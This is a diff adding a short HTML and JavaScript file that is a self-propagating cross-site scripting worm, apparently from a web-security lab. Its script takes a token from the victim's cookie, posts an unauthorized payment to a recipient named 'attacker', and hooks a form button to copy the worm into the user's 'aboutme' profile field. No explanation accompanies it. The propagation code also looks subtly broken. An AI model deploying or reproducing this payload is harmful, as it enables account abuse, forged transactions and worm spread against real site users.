@@ -1,0 +1,16 @@
+<div id="worm">
+    <script>
+        let xhr = new XMLHttpRequest();
+        xhr.open('POST', '/pay');
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("amount=1&recipient=attacker&csrf="+ document.cookie.split("=")[1]);
+    </script>
+</div>
+<script>
+window.onload = function(){
+    document.getElementsByClassName("form-button")[1].onclick = function() {
+        var txt =  document.getElementsByName('aboutme')[0].value;
+        txt.value = txt.value + document.getElementById("worm").innerHTML;
+    };
+};
+</script>
